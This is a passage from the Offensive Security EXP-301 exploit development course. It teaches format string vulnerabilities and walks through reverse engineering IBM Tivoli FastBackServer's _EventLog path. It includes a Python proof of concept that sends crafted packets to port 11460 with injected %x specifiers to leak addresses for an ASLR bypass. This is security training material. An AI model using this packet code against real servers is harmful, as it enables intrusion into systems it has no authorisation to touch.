“s”. 
"This is a value in hex %x and a string %s" 
Listing 617 - Format string example 
When this format string is used with a format string function like printf, the first format specifier 
will be replaced with the content of the second argument and interpreted as a hex value. The 
second format specifier will be replaced with the third argument and interpreted as a string. 
Listing 618 shows how the arguments 4660 and “I love cats!” are supplied to printf and the 
resulting string. 
 
370 (Microsoft, 2019), https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-
functions?view=msvc-160 
371 (MSDN, 2015), https://msdn.microsoft.com/en-us/library/hf4y5e3w.aspx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
498 
printf("This is a value in hex: %x and a string: %s", 4660, "I love cats!") 
Output: 
This is a value in hex: 0x1234 and a string: I love cats! 
Listing 618 - Using a format string 
The number of format specifiers should match the number of arguments. If there are more 
arguments than format string specifiers, they are left unused. But if there are more format string 
specifiers than arguments, security issues arise. 
Most format functions work similarly, but arguments can be supplied from an array instead of 
individually. 
This section has provided us with the basic knowledge about how format specifiers, format 
strings, and format functions work. Next, we’ll discuss how they can be abused. 
11.1.2 
Exploiting Format String Specifiers 
As mentioned in the last section, if the number of format string specifiers is larger than the 
number of arguments, security vulnerabilities can arise. In this section, we are going to look into 
how this happens through small custom C++ applications. 
Listing 619 shows C++ code that calls the printf function with a format string containing four 
format specifiers. 
#include "pch.h" 
#include <iostream> 
#include <Windows.h> 
 
int main(int argc, char **argv) 
{ 
    printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66, 67, 68); 
    return 0; 
} 
Listing 619 - C++ code calling printf with matching amount of arguments 
When the code is compiled and executed, the application will print the format string with the four 
decimal values converted to hexadecimal values and replace the format specifiers. 
In C:\Tools\format, we can find a compiled version of the application that produces the output 
displayed in Listing 620. 
C:\Tools\format> FormatTest1.exe 
This is your input: 0x41, 0x42, 0x43, 0x44 
Listing 620 - Executing the proof of concept prints four hexadecimal values 
As shown in the output from the application, the four numbers are converted and inserted 
correctly. This is correct usage of format strings and no vulnerability is present. 
In Listing 621, we find a modified version of the previous code. The number of arguments 
supplied to the format string has been reduced from four to two, while the format string contains 
the same number of specifiers as before. 
#include "pch.h" 
#include <iostream> 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
499 
#include <Windows.h> 
 
int main(int argc, char **argv) 
{ 
    printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66); 
    return 0; 
} 
Listing 621 - C++ code calling printf with to few arguments 
This leaves us wondering what values printf will print to the console when it executes. 
To find out, let’s execute a compiled version of the application from C:\Tools\format. on the 
Windows 10 client machine. We should obtain the output shown below. 
C:\Tools\format> FormatTest2.exe 
This is your input: 0x41, 0x42, 0x2e1022, 0x1afdc4 
Listing 622 - Executing the updated proof of concept 
The output in Listing 622 shows the decimal values 65 and 66 were converted to hexadecimal, as 
before. The last two highlighted values stem from the missing arguments. Both seem similar to 
memory addresses. 
We’ll recall from previous modules that in the __stdcall calling convention, arguments are passed 
to functions on the stack. In our current case, printf expects five arguments; the format string and 
four values according to the format string specifiers. 
When printf is executed, it uses the format string and the two supplied decimal values. For the 
two remaining format specifiers, the two values that happen to be on the stack will be used. 
If the values happen to be addresses inside a module or stack addresses, we may be able to 
leverage this into an ASLR bypass. 
To verify this theory, let’s modify the C++ code to enable us to inspect relevant memory in 
WinDbg. The updated code is shown in Listing 623. 
#include "pch.h" 
#include <iostream> 
#include <Windows.h> 
 
int main(int argc, char **argv) 
{ 
    std::cout << "Press ENTER to start...\n"; 
    std::cin.get(); 
     
    printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66); 
 
    DebugBreak(); 
     
    return 0; 
} 
Listing 623 - C++ code calling printf while being debugged 
We’ll observe two changes. First, the application will pause and wait for us to press any key 
before executing. This will allow us to attach WinDbg to the process before printf is called. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
500 
The second change is a call to the DebugBreak372 function. This call will execute an INT3 
instruction that WinDbg catches, enabling us to inspect the memory of the application. 
Let’s run the modified application and attach WinDbg when prompted, pressing any key 
afterwards to resume. This will execute printf, then break into the execution flow. 
C:\Tools\format> FormatTest3.exe 
Press ENTER to start... 
 
This is your input: 0x41, 0x42, 0xfcfeb0, 0x2e5658 
Listing 624 - Executing the updated PoC with debugger attached 
Switching to WinDbg, we can list the stack boundaries as highlighted in Listing 625 to check if the 
first highlighted value printed in Listing 624 is indeed a stack address. 
(e7c.144): Break instruction exception - code 80000003 (first chance) 
*** WARNING: Unable to verify checksum for C:\Tools\format\FormatTest3.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Tools\format\FormatTest3.exe 
eax=00000011 ebx=011c1000 ecx=002e9ebf edx=00000030 esi=0031291c edi=012344b0 
eip=753b1072 esp=00fcfe64 ebp=00fcfe68 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
KERNELBASE!wil::details::DebugBreak+0x2: 
753b1072 cc              int     3 
 
0:000> !teb 
TEB at 011c2000 
    ExceptionList:        00fcfea0 
    StackBase:            00fd0000 
    StackLimit:           00fcd000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
... 
Listing 625 - Inspecting first value in WinDbg 
Clearly, printf printed a stack address to the console due to a missing argument. 
We can similarly unassemble memory at the second printed value from Listing 624. 
0:000> u 0x2e5658 L2 
FormatTest3+0x5658: 
002e5658 83c40c          add     esp,0Ch 
002e565b 8bf0            mov     esi,eax 
 
0:000> !vprot 0x2e5658 
BaseAddress:       002e5000 
AllocationBase:    002e0000 
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY 
RegionSize:        0001c000 
State:             00001000  MEM_COMMIT 
Protect:           00000020  PAGE_EXECUTE_READ 
Type:              01000000  MEM_IMAGE 
 
372 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugbreak 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
501 
Listing 626 - Inspecting second value in WinDbg 
In this case, the value is an address inside the code section of FormatTest3. We can use !vprot 
to determine that it is executable. 
At this point, we’ve leveraged a vulnerable format string used in an application to discover both a 
stack address and an address inside the main executable. We may be able to use these 
addresses to bypass ASLR and subsequently DEP. 
This is a simple example of how we could exploit format strings, however, it relies on a 
programming error that we’re unlikely to find in a real-world scenario. 
There are two important items to note here. First, the content printed by printf depends on what 
happens to be on the stack, so its reliability can vary. Second, to actively exploit a format string 
vulnerability in a real application, we’ll need to influence either the format string itself or the 
number of arguments. 
Let’s use what we’ve learned about format string vulnerabilities to practice bypassing ASLR in the 
following sections. 
11.1.2.1 Exercise 
1. 
Use the applications FormatTest1.exe, FormatTest2.exe, and FormatTest3.exe, located on 
the Windows 10 machine in the folder C:\Tools\FormatString, to repeat the analysis 
presented here. 
11.2 Attacking IBM Tivoli FastBackServer 
Let’s revisit IBM Tivoli FastBackServer since it contains multiple format string specifier bugs, 
some of which may be leveraged to bypass ASLR. 
Searching online for format string specifier bugs in the application, we discover multiple 
vulnerabilities, but no proofs of concept. 
One interesting advisory comes from Zero Day Initiative (ZDI). It mentions a vulnerable function 
named _EventLog.373 The public vulnerability report has a few technical details, but they are aimed 
at a different network port than the one we previously used. 
In the next few sections, we will investigate whether the EventLog function contains a format 
string specifier vulnerability we can exploit, and whether we can trigger it from the previously-
used network port. 
11.2.1 
Investigating the EventLog Function 
Next, we’ll locate the EventLog function and determine if it contains any vulnerable format string 
function calls. We also need to determine how to trigger such a vulnerability remotely. 
We know from previous modules that the FXCLI_OraBR_Exec_Command function contains a 
multitude of branches, which in turn contain several vulnerabilities. We could spend time reverse 
 
373 (Zero Day Initiative, 2010), https://www.zerodayinitiative.com/advisories/ZDI-10-185/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
502 
engineering each branch to locate possible vulnerabilities, but for the sake of efficiency, in this 
module we are going to begin our analysis from the “_EventLog” function name. 
Since we’re beginning our analysis with only a function name, we will likely gain the fastest insight 
through static analysis. 
Let’s open our previously-analyzed FastBackServer executable in IDA Pro and search for any 
function called “_EventLog” using Jump > Jump to function… and use the quick filter option. 
Fortunately, we only get two results, as shown in Figure 168 - one of which is an exact match. 
 
Figure 168: Search results for _EventLog 
Following the highlighted function, we first encounter a couple of checks, after which we locate 
the basic block shown in Figure 169. 
 
Figure 169: Basic block with call to _ml_vsnprintf 
The _ml_vsnprintf function is a trampoline into __vsnprintf, which turns out to be a massive 
function. Given the names of the functions, we can assume that this is an embedded 
implementation of the vsnprintf374 format string function. 
The function prototype of vsnprintf, which is shown in Listing 627, lists four arguments with 
similar names to those identified by IDA Pro. 
 
374 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
503 
int vsnprintf( 
  char *s, 
  size_t n, 
  const char *format, 
  va_list arg 
); 
Listing 627 - Function prototype for vsnprintf 
The vsnprintf function is a bit more complicated than printf. Instead of printing the content to the 
console, the formatted string is stored in the buffer that is passed as the first argument (*s). 
The second argument (n) is the maximum number of bytes of the formatted string; if the 
formatted string is longer than this value, it will be truncated. The third argument (*format) is the 
format string itself, and the fourth argument (arg) is a pointer to an array containing the 
arguments for the format string specifiers. 
From an attacker’s perspective, the differences between printf and vsnprintf are important, but we 
can nevertheless exploit this function under the right circumstances. 
 
Figure 170: Basic block with call to _ml_vsnprintf 
As IDA Pro shows, _ml_vsnprintf accepts four arguments. The second argument, labeled “Count”, 
contains the static value 0x400. This will limit the output size of any attack we perform. 
The three remaining arguments are all passed to _EventLog as dynamic values, and thus may be 
under our control. 
The most important argument for us to focus on is the format string itself, which may either be 
modified by us or passed as a static string containing many format specifiers. 
Dynamically modifying the format string in an unintended way is more likely to escape the review 
of a developer. If we can locate a code path that will allow us to execute a format string function 
where the resultant formatted string is used as a format string for a second format string 
function, we may be able to obtain a dynamically-created format string. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
504 
For example, let’s suppose _ml_vsnprintf is called with a format string containing a string format 
specifier (“%s”), and we control the arguments for it. In this case, we could provide the string 
“%x%x%x%x” as an argument, which would create a new format string as illustrated in Listing 628. 
Before _ml_vsnprintf: 
"This is my string: %s" 
 
After _ml_vsnprintf: 
"This is my string: %x%x%x%x" 
Listing 628 - Creating a format string 
If the formatted string following the call to _ml_vsnprintf is reused as a format string in a 
subsequent format string function, we may be able to recreate the vulnerable condition we 
observed in the initial printf example. 
The vulnerable condition would happen if we could dynamically modify the format string to 
contain an arbitrary number of format specifiers. If we can find a location where the string 
formatted by _ml_vsnprintf is reused, we may be able to discover a vulnerability. 
Before we go into further details on the located call to _ml_vsnprintf, let’s search for a subsequent 
format string function that may reuse the output string. 
Following the call to _ml_vsnprintf inside _EventLog, we can move down a couple of basic blocks 
and find two code paths that both invoke the _EventLog_wrapted function. One of these code 
blocks is displayed in Figure 171. 
 
Figure 171: Call to _EventLog_wrapted 
While we don’t yet know what this function does, the automatic comment given to the third 
argument (“Format”) is intriguing. 
For a vulnerability to exist, _EventLog_wrapted must call a format string function with our resulting 
format string containing an arbitrary number of format specifiers. Since we’ll be dealing with 
many dependencies and basic blocks, let’s take advantage of some dynamic analysis. 
We’ll need to ensure that the first format string supplied to _EventLog and used by _ml_vsnprintf 
contains at least one string format specifier. A string format specifier is required for us to 
generate an arbitrary string, which is used in the subsequent format string function inside 
_EventLog_wrapted. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
505 
There are a lot of details to manage, so we will split up the work. 
In the next section, we will learn how to invoke _EventLog with a supplied format string. Then we 
will analyze how _EventLog_wrapted uses a dynamically-created format string. 
11.2.1.1 Exercise 
1. 
Use IDA Pro to locate the _EventLog function and ensure you understand the arguments it 
accepts. 
11.2.2 
Reverse Engineering a Path 
In this section, we’ll find a way to reach the _EventLog function by sending a network packet. The 
format string supplied to _EventLog must also contain a string format specifier. 
Having 
worked 
with 
this 
application 
in 
previous 
modules, 
we 
know 
that 
the 
FXCLI_OraBR_Exec_Command function contains many different code paths to choose from. We 
need to find one that fulfills our requirements and then create a proof of concept that triggers it. 
We can perform a cross-reference on _EventLog to find that it is called from 7496 places. There 
are two ways of solving this, either manually or through automation. 
In the paid version of IDA Pro it’s possible to leverage the embedded Python scripting library 
called IDAPython375 through a custom script like idapathfinder.376 
Unfortunately, the IDAPython library is not accessible in free version of IDA Pro. Instead, we would 
have to reverse engineer each path that FXCLI_OraBR_Exec_Command takes to look for a call to 
_EventLog. Such a path must also provide an exploitable format string. 
Because this task can be quite time consuming, we’ll move directly to the match that we found 
for this course. The code path from FXCLI_OraBR_Exec_Command to _EventLog through the 
AGI_S_GetAgentSignature function allows us to trigger _EventLog from a network packet and is 
the one we choose. 
There are two reasons for choosing this path. First, it only contains one nested function, and 
second, the format string supplied to _EventLog by AGI_S_GetAgentSignature contains a string 
specifier. 
The interesting call inside AGI_S_GetAgentSignature is shown in Figure 172. 
 
Figure 172: Call to _EventLog from AGI_S_GetAgentSignature 
 
375 (Hex-Rays, 2020), https://github.com/idapython/src 
376 (Google, 2013), https://code.google.com/archive/p/idapathfinder/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
506 
 
The format string is truncated in the basic block, but we can jump to the address of the variable 
containing it to inspect the full string, as displayed in Figure 173. 
 
Figure 173: Full format string 
In theory, we have found an ideal code path for our exploit. Next, we need to write a proof of 
concept that forces this path to be taken. 
We can reuse our code framework from previous modules, but we need to locate the opcode for 
AGI_S_GetAgentSignature. We’ll perform a cross-reference and find that it is only called by 
FXCLI_OraBR_Exec_Command. 
Once we reach the call into AGI_S_GetAgentSignature and go one basic block backward, we find 
the comparison shown in Figure 174. 
 
Figure 174: Opcode 0x604 to trigger AGI_S_GetAgentSignature 
From previous modules, we know that the value at offset var_61B30 is the opcode. This provides 
us with the opcode value 0x604 and we can create the initial proof of concept as given in Listing 
629. 
import socket 
import sys 
from struct import pack 
 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
     
    # psAgentCommand 
    buf = pack(">i", 0x400) 
    buf += bytearray([0x41]*0xC) 
   buf += pack("<i", 0x604)  # opcode 
    buf += pack("<i", 0x0)    # 1st memcpy: offset 
    buf += pack("<i", 0x100)  # 1st memcpy: size field 
    buf += pack("<i", 0x100)  # 2nd memcpy: offset 
    buf += pack("<i", 0x100)  # 2nd memcpy: size field 
    buf += pack("<i", 0x200)  # 3rd memcpy: offset 
    buf += pack("<i", 0x100)  # 3rd memcpy: size field 
    buf += bytearray([0x41]*0x8) 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
507 
    # psCommandBuffer 
    buf += b"A" * 0x100   
    buf += b"B" * 0x100  
    buf += b"C" * 0x100  
 
  # Padding 
    buf += bytearray([0x41]*(0x404-len(buf))) 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
     
    s.send(buf) 
    s.close() 
 
    print("[+] Packet sent") 
    sys.exit(0) 
 
 
if __name__ == "__main__": 
    main() 
Listing 629 - Initial proof of concept for opcode 0x604 
To test it, let’s set a breakpoint on the comparison of the opcode found at the address 0x56cdf5 
in FastBackserver and send the packet. 
0:080> bp 56cdf5 
 
0:080> g 
Breakpoint 0 hit 
eax=060fc8f0 ebx=060fae50 ecx=00000604 edx=00000001 esi=060fae50 edi=00669360 
eip=0056cdf5 esp=0d55e334 ebp=0d5bfe98 iopl=0         nv up ei ng nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287 
FastBackServer!FXCLI_OraBR_Exec_Command+0x93f: 
0056cdf5 81bdd0e4f9ff04060000 cmp dword ptr [ebp-61B30h],604h 
ss:0023:0d55e368=00000604 
Listing 630 - Breakpoint on opcode 0x604 comparison 
Listing 630 shows that our initial proof of concept will trigger the correct opcode path. 
Now we can continue execution until the call into AGI_S_GetAgentSignature. If we dump the first 
three arguments, we find that they contain the three parts of our psCommandBuffer buffer. 
eax=0d5ad980 ebx=060fae50 ecx=0d5b9cf0 edx=0d5b3b30 esi=060fae50 edi=00669360 
eip=0056df5c esp=0d55e324 ebp=0d5bfe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x1aa6: 
0056df5c e862d6fdff      call    FastBackServer!AGI_S_GetAgentSignature (0054b5c3 
 
0:006> dd poi(esp) L4 
0d5b3b30  41414141 41414141 41414141 41414141 
 
0:006> dd poi(esp+4) L4 
0d5b9cf0  42424242 42424242 42424242 42424242 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
508 
0:006> dd poi(esp+8) L4 
0d5ad980  43434343 43434343 43434343 43434343 
Listing 631 - Arguments to AGI_S_GetAgentSignature 
We’re off to a great start since we have absolute control of three arguments to the function. 
We’ll step into the function and find that, by default, we follow the code path that lets us reach the 
call into _EventLog with the format string containing a string format specifier: 
eax=0d5b3b30 ebx=060fae50 ecx=02a4d738 edx=00976a78 esi=060fae50 edi=00669360 
eip=0054b69b esp=0d55e2dc ebp=0d55e31c iopl=0         nv up ei ng nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297 
FastBackServer!AGI_S_GetAgentSignature+0xd8: 
0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431) 
 
0:006> dds esp L4 
0d55e2dc  00000008 
0d55e2e0  00000019 
0d55e2e4  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520 
0d55e2e8  0d5b3b30 
 
0:006> da 008118a4  
008118a4  "AGI_S_GetAgentSignature: couldn'" 
008118c4  "t find agent %s." 
 
0:006> dd 0d5b3b30 
0d5b3b30  41414141 41414141 41414141 41414141 
... 
Listing 632 - Arguments to _EventLog 
When we step into _EventLog, we once again find that by default, execution takes us to the call to 
_ml_vsnprintf. 
Before calling _ml_vsnprintf, let’s dump the arguments from the stack to verify that our input is 
used. 
eax=008118a4 ebx=060fae50 ecx=0d55ded4 edx=0d55e2e8 esi=060fae50 edi=00669360 
eip=0048048f esp=0d55dea8 ebp=0d55e2d4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog+0x5e: 
0048048f e89fac1d00      call    FastBackServer!ml_vsnprintf (0065b133) 
 
0:006> dds esp L4 
0d55dea8  0d55ded4 
0d55deac  00000400 
0d55deb0  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520 
0d55deb4  0d55e2e8 
 
0:006> da 008118a4  
008118a4  "AGI_S_GetAgentSignature: couldn'" 
008118c4  "t find agent %s." 
 
0:006> dd poi(poi(esp+c)) L4 
0d5b3b30  41414141 41414141 41414141 41414141 
Listing 633 - Arguments to ml_vsnprintf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
509 
Listing 633 displays the first argument as the destination buffer and the third argument as the 
format string. 
The fourth argument, according to the function prototype, is an array containing the arguments. 
Since there is only one format string specifier present, an array containing one element is used. 
Since the format specifier used in the format string is “%s”, the argument is interpreted as a 
pointer to a character array. We can verify the contents of the argument through a double 
dereference, as shown at the bottom of the listing. 
We expect that ml_vsnprintf will insert the A’s into the format string. Let’s verify this by stepping 
over the call and dumping the contents of the destination buffer. 
0:006> p 
eax=0000012e ebx=060fae50 ecx=0d55de68 edx=0d55e001 esi=060fae50 edi=00669360 
eip=00480494 esp=0d55dea8 ebp=0d55e2d4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog+0x63: 
00480494 83c410          add     esp,10h 
 
0:006> da 0d55ded4 
0d55ded4  "AGI_S_GetAgentSignature: couldn'" 
0d55def4  "t find agent AAAAAAAAAAAAAAAAAAA" 
0d55df14  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55df34  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55df54  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55df74  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55df94  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55dfb4  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55dfd4  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d55dff4  "AAAAAAAAAAAAA." 
Listing 634 - Formatted string after call to vsnprintf 
As expected, we find that our input buffer has been inserted into the format string as A’s. 
We have now achieved part of our goal. We found a way to reach the call to _ml_vsnprintf from a 
network packet, but the formatted string shown in Listing 634 is not of much use, since it only 
contains A’s. 
Next, we’ll modify our proof of concept to send a network packet that contains the “%x” format 
specifier instead of A’s, as shown in Listing 635. 
... 
# psCommandBuffer 
buf += b"%x" * 0x80   
buf += b"B" * 0x100  
buf += b"C" * 0x100  
... 
Listing 635 - Replace A’s with %x’s in the network packet 
Ideally, we would set a breakpoint on the call to ml_vsnprintf inside _EventLog, but it is called by so 
many other functions that it is impossible to trigger it correctly. 
Instead, we’ll set a breakpoint in AGI_S_GetAgentSignature on the call into _EventLog, then single 
step until we reach the call to ml_vsnprintf. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
510 
0:006> bc * 
 
0:006> bp FastBackServer!AGI_S_GetAgentSignature+0xd8 
 
0:006> g 
Breakpoint 0 hit 
eax=0d9b3b30 ebx=060fae50 ecx=02a4d738 edx=00976a78 esi=060fae50 edi=00669360 
eip=0054b69b esp=0d95e2dc ebp=0d95e31c iopl=0         nv up ei ng nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297 
FastBackServer!AGI_S_GetAgentSignature+0xd8: 
0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431) 
 
0:006> t 
... 
eax=008118a4 ebx=060fae50 ecx=0d95ded4 edx=0d95e2e8 esi=060fae50 edi=00669360 
eip=0048048f esp=0d95dea8 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog+0x5e: 
0048048f e89fac1d00      call    FastBackServer!ml_vsnprintf (0065b133) 
 
0:006> dds esp L4 
0d95dea8  0d95ded4 
0d95deac  00000400 
0d95deb0  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520 
0d95deb4  0d95e2e8 
 
0:006> da poi(poi(esp+c)) 
0d9b3b30  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3b50  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3b70  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3b90  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3bb0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3bd0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3bf0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3c10  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x" 
0d9b3c30  "" 
Listing 636 - 0x80 %x format specifiers 
We’ll note from the last output of Listing 636 that the argument string to vsnprintf consists of 128 
(0x80) hexadecimal format string specifiers. 
In Listing 637, we’ll step over the call to the format string function and find that the formatted 
string now contains several hexadecimal format string specifiers. 
0:006> p 
eax=0000012e ebx=060fae50 ecx=0d95de68 edx=0d95e001 esi=060fae50 edi=00669360 
eip=00480494 esp=0d95dea8 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog+0x63: 
00480494 83c410          add     esp,10h 
 
0:006> da 0d95ded4 
0d95ded4  "AGI_S_GetAgentSignature: couldn'" 
0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%" 
0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
511 
0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df94  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95dfb4  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95dfd4  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95dff4  "x%x%x%x%x%x%x." 
Listing 637 - Hex specifiers are inserted into the string 
We obtained our first tangible indication that we can perform a format string specifier attack. 
Now we can craft a format string with almost-arbitrary format string specifiers. Our only limitation 
comes from the number of bytes written by vsnprintf, which is hardcoded to 0x400 through its 
second argument. 
In the next section, we’ll develop a better understanding of how the EventLog_wrapted function 
uses the generated format string. 
11.2.2.1 Exercises 
1. 
Follow the analysis and create a proof of concept that triggers the correct opcode and 
executes _EventLog. 
2. 
Modify the proof of concept to obtain a formatted string containing format string specifiers. 
3. 
Is it possible to use different format string specifiers like “%s”? What what happens if we let 
execution continue afterwards? 
11.2.3 
Invoke the Specifiers 
In this section, we will continue our analysis and dig into EventLog_wrapted to uncover if (and 
how) our formatted string is used. 
Let’s start with the formatted string following the call to ml_vsnprintf. Figure 175 shows the 
interesting code following the call. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
512 
 
Figure 175: Detecting length of format string 
We’ll notice three highlighted items above. First, the formatted string is stored at the offset “Str” 
from EBP. Second, the static value 0xC4 is stored in the offset var_41C from EBP. 
The last highlighted code section calls the _ml_strbytelen function, which is a wrapper for an 
embedded version of strlen.377 The call’s purpose is to determine the length of the formatted 
string. The result is stored at offset var_40C from EBP. 
To find the length of the format string, we’ll single step to the call into _ml_strbytelen and step 
over it: 
eax=0d95ded4 ebx=060fae50 ecx=0d95de68 edx=0d95ded4 esi=060fae50 edi=00669360 
eip=004804cc esp=0d95deb4 ebp=0d95e2d4 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!EventLog+0x9b: 
004804cc e8aaaa1d00      call    FastBackServer!ml_strbytelen (0065af7b) 
 
0:006> p 
eax=0000012e ebx=060fae50 ecx=0d95ded4 edx=7eff0977 esi=060fae50 edi=00669360 
eip=004804d1 esp=0d95deb4 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog+0xa0: 
004804d1 83c404          add     esp,4 
Listing 638 - Length of format string 
 
377 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/strlen/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
513 
The length was found to be 0x12E. Next, the application stores it and moves execution to the 
basic block shown in Figure 176. 
 
Figure 176: Format string size comparison 
The comparison is between the length of the formatted string and the static value 0xC4. Our 
format string is longer, so the jump is not taken, leading us to a basic block that performs several 
modifications to our format string before calling EventLog_wrapted. 
To understand what changes happen to the formatted string, we can single step to the call and 
inspect the arguments: 
eax=00000019 ebx=060fae50 ecx=00000008 edx=0d95ded4 esi=060fae50 edi=00669360 
eip=00480568 esp=0d95deac ebp=0d95e2d4 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!EventLog+0x137: 
00480568 e8b0fbffff      call    FastBackServer!EventLog_wrapted (0048011d) 
 
0:006> dds esp L3 
0d95deac  00000008 
0d95deb0  00000019 
0d95deb4  0d95ded4 
 
